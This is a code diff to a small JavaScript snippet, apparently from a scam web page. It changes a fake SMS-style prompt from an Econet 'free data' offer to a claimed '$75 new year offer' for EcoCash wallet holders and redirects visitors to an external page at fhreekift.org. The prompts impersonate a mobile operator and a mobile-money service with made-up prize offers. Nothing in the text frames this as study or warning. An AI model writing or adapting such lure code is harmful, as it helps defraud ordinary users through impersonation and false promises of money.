@@ -1,10 +1,10 @@
   
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'ACTIVATE FREE DATA'
+var password = 'WITHDRAW $75'
 password = prompt(
-  'SMS: Congratulations! Your Econet Number is eligible to receive Christmas and new year offer. Please press OK to Enter your Number.',
-  'ACTIVATE FREE DATA'
+  'SMS: Congratulations! Your ECOCASH Wallet is eligible to receive $75 new year offer. Please press OK to Withdraw.',
+  'WITHDRAW $75'
 );
-if (password != 'ACTIVATE FREE DATA') {
+if (password != 'WITHDRAW $75') {
   location.href = 'https://fhreekift.org/econet.html';
 }
